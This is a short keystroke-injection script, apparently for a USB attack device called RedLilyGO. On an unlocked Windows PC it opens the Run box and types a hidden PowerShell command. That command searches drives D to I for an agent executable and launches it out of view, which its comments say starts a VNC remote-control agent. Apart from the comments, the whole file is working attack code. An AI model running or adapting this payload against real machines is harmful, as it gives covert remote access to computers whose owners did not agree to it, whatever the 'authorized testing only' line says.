REM RedLilyGO - Agent VNC auto-start. Requires RedLilyGO.Agent.exe in the SD root. Authorized testing only.
REM Keep the target PC unlocked and focused while this runs: Win+R needs the desktop.
REM Keep the typed Run command short (Windows Run truncates near 260 chars). This
REM checks fixed drive letters instead of Get-Volume, which can stall while the
REM SD re-enumerates as a USB drive.
ATTACKMODE HID STORAGE
DELAY 8000
GUI r
DELAY 1500
STRING powershell -w hidden -c "'D','E','F','G','H','I'|ForEach-Object{$p=$_+':\RedLilyGO.Agent.exe';if(Test-Path $p){Start-Process $p -WindowStyle Hidden}}"
ENTER
